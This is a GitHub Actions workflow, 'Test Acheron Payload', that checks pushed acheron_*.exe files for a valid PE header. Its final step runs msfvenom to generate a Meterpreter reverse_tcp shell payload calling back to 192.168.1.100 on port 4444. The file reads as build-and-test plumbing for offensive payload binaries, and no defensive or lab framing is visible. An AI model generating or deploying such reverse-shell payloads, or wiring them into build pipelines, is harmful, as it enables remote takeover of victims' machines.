name: Test Acheron Payload

on:
  workflow_dispatch:
  push:
    paths:
      - 'acheron_*.exe'

jobs:
  test-payload:
    runs-on: windows-latest
    timeout-minutes: 10
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      
      - name: List files
        run: dir
        shell: pwsh
      
      - name: Verify payload exists
        run: |
          $files = Get-ChildItem acheron_*.exe
          if ($files.Count -eq 0) {
            Write-Error "No EXE found!"
            exit 1
          }
          foreach ($file in $files) {
            Write-Host "Testing: $($file.Name)"
            $sig = (Get-Item $file.FullName).Length
            Write-Host "Size: $sig bytes"
            # Verify PE header
            $bytes = [System.IO.File]::ReadAllBytes($file.FullName)
            if ($bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) {
              Write-Host "✅ Valid PE header (MZ)"
            } else {
              Write-Error "Invalid PE header"
              exit 1
            }
          }
        shell: pwsh
      
      - name: Test msfvenom payload generation
        run: |
          # Verify msfvenom can generate the same payload type
          msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f hex EXITFUNC=thread 2>&1 | Select-String "Payload size" | Write-Host
          Write-Host "✅ msfvenom payload generation OK"
        shell: pwsh